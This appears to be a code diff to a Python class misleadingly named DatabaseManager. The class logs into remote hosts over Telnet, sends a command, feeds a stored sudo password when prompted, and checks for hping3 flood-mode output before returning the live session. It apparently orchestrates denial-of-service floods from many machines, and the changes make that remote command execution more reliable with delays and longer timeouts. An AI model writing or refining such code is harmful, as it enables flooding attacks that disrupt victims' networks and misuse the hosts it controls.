@@ -183,45 +183,57 @@ class DatabaseManager:
 
                     if match:
                         logging.info(f"Initial shell prompt detected on {ip}. Proceeding to send command.")
+                        # Add a small delay after detecting the initial shell prompt
+                        time.sleep(1) # Increased delay
+
+                        # Read any immediate output that might include welcome messages or command echoes
+                        logging.info(f"Reading immediate output on {ip} after initial shell prompt...")
+                        immediate_output_after_prompt = tn.read_very_eager()
+                        if immediate_output_after_prompt:
+                            logging.info(f"Immediate output from {ip} after initial shell prompt: {immediate_output_after_prompt.decode(errors='ignore')}")
+
                         # Send the command without nohup or &
                         full_command = command
                         logging.info(f"Sending command to {ip} via Telnet: {full_command}")
                         tn.write(full_command.encode() + b"\n") # Send command with newline
                         logging.info(f"Command written to {ip}")
 
-                        # Use expect to look for password prompt or hping3 startup output or shell prompt
-                        hping3_startup_patterns = [b"HPING ", b"hping in flood mode", b"HPING \\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}"] # Added more robust hping3 patterns
-                        sudo_prompt_pattern = b"[sudo] password for " # More specific sudo prompt pattern
-                        shell_prompt_patterns = [b"\\r\\n$", b"\\n$", b"\\r\\n#", b"\\n#", b"\\r\\n>", b"\\n>"] # Shell prompt patterns
+                        # Add a small delay after sending the command to allow the device to respond
+                        time.sleep(2) # Increased delay after sending command
+                        logging.info(f"Waited 2 seconds after sending command to {ip}.")
 
-                        # First, look for sudo prompt or immediate hping3 output/shell prompt
+                        # Use expect to look for password prompt, hping3 startup output, or shell prompt
+                        # Increased timeout for robustness
+                        hping3_startup_patterns = [b"HPING ", b"hping in flood mode", b"HPING \d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}"]
+                        sudo_prompt_pattern = b"[sudo] password for "
+                        shell_prompt_patterns = [b"\r\n$", b"\n$", b"\r\n#", b"\n#", b"\r\n>", b"\n>"]
+
+                        # Expect sudo prompt, hping3 output, or shell prompt after sending the command
                         logging.info(f"Checking for sudo prompt, hping3 output, or shell prompt on {ip} after sending command...")
-                        execution_patterns_initial = [sudo_prompt_pattern] + hping3_startup_patterns + shell_prompt_patterns
-                        index_initial, match_initial, response_initial = tn.expect(execution_patterns_initial, timeout=15) # Increased timeout
+                        execution_patterns_after_cmd = [sudo_prompt_pattern] + hping3_startup_patterns + shell_prompt_patterns
+                        index_after_cmd, match_after_cmd, response_after_cmd = tn.expect(execution_patterns_after_cmd, timeout=20)
 
-                        logging.info(f"Read from {ip} (after sending command - initial expect): {response_initial.decode(errors='ignore')}")
+                        logging.info(f"Read from {ip} (after sending command - expect): {response_after_cmd.decode(errors='ignore')}")
 
-                        if match_initial:
-                            if match_initial.group(0) == sudo_prompt_pattern:
-                                logging.info(f"Sudo password prompt detected on {ip} after sending command.")
+                        if match_after_cmd:
+                            if match_after_cmd.group(0) == sudo_prompt_pattern:
+                                logging.info(f"Sudo password prompt detected on {ip}.")
                                 if password:
-                                    tn.write((password + "\\n").encode())
+                                    tn.write((password + "\n").encode())
                                     logging.info(f"Sent sudo password to {ip}.")
                                     # After sending sudo password, expect hping3 output or shell prompt
                                     logging.info(f"Waiting for hping3 output or shell prompt after sudo password on {ip}...")
                                     execution_patterns_after_sudo = hping3_startup_patterns + shell_prompt_patterns
-                                    index_after_sudo, match_after_sudo, response_after_sudo = tn.expect(execution_patterns_after_sudo, timeout=15) # Increased timeout
+                                    index_after_sudo, match_after_sudo, response_after_sudo = tn.expect(execution_patterns_after_sudo, timeout=20) # Increased timeout
                                     logging.info(f"Read from {ip} (after sudo password): {response_after_sudo.decode(errors='ignore')}")
 
                                     if match_after_sudo:
                                         if match_after_sudo.group(0) in hping3_startup_patterns:
                                             logging.info(f"Hping3 startup output detected after sudo password on {ip}. Command likely executing.")
-                                            # Return session immediately as hping3 is foregrounded
                                             return tn
                                         elif match_after_sudo.group(0) in shell_prompt_patterns:
                                             logging.warning(f"Shell prompt detected after sending sudo password on {ip}. Hping3 may not have started or finished quickly.")
-                                            # Read any immediate output before closing
-                                            time.sleep(1) # Small delay
+                                            time.sleep(1)
                                             immediate_output = tn.read_very_eager()
                                             if immediate_output:
                                                 logging.info(f"Immediate output from {ip} before closing: {immediate_output.decode(errors='ignore')}")
@@ -233,16 +245,14 @@ class DatabaseManager:
                                         return None
                                 else:
                                     logging.warning(f"No password available for sudo on {ip}, command likely failed.")
-                                    tn.close() # Close session as command likely failed
+                                    tn.close()
                                     return None
-                            elif match_initial.group(0) in hping3_startup_patterns:
+                            elif match_after_cmd.group(0) in hping3_startup_patterns:
                                 logging.info(f"Hping3 startup output detected on {ip} immediately after sending command. Command likely executing.")
-                                # Return session immediately as hping3 is foregrounded
                                 return tn
-                            elif match_initial.group(0) in shell_prompt_patterns:
+                            elif match_after_cmd.group(0) in shell_prompt_patterns:
                                 logging.warning(f"Shell prompt detected immediately after sending command on {ip}. Command may have finished quickly or failed without requesting sudo.")
-                                # Read any immediate output before closing
-                                time.sleep(1) # Small delay
+                                time.sleep(1)
                                 immediate_output = tn.read_very_eager()
                                 if immediate_output:
                                     logging.info(f"Immediate output from {ip} before closing: {immediate_output.decode(errors='ignore')}")
@@ -250,8 +260,7 @@ class DatabaseManager:
                                 return None
                         else:
                             logging.error(f"Could not detect sudo prompt, hping3 output, or shell prompt after sending command on {ip}. Session may be unstable or command failed.")
-                            # Read any immediate output before closing
-                            time.sleep(1) # Small delay
+                            time.sleep(1)
                             immediate_output = tn.read_very_eager()
                             if immediate_output:
                                 logging.info(f"Immediate output from {ip} after failed expectation: {immediate_output.decode(errors='ignore')}")
@@ -259,35 +268,34 @@ class DatabaseManager:
                             return None
 
                     else:
-                        logging.error(f"Could not detect password prompt on {ip} after sending username.")
+                        logging.error(f"Could not detect initial shell prompt on {ip} after login. Cannot send command.")
                         tn.close()
                         return None
 
                 else:
-                     logging.error(f"Could not detect initial shell prompt on {ip} after login. Cannot send command.")
-                     tn.close()
-                     return None
+                    logging.error(f"Could not detect password prompt on {ip} after sending username.")
+                    tn.close()
+                    return None
 
             else:
-                 logging.error(f"Could not detect login prompt on {ip}.")
-                 if tn:
-                      try:
-                           tn.close()
-                      except:
-                           pass
-                 return None
+                logging.error(f"Could not detect login prompt on {ip}.")
+                if tn:
+                    try:
+                        tn.close()
+                    except:
+                        pass
+                return None
 
         except EOFError:
-             logging.error(f"Telnet connection to {ip} closed unexpectedly (EOF).")
-             if tn:
-                  try:
-                       tn.close()
-                  except:
-                       pass
-             return None
+            logging.error(f"Telnet connection to {ip} closed unexpectedly (EOF).")
+            if tn:
+                try:
+                    tn.close()
+                except:
+                    pass
+            return None
         except Exception as e:
             logging.error(f"Failed during Telnet interaction with {ip}: {e}")
-            # Ensure connection is closed if an error occurs
             if tn:
                 try:
                     tn.close()
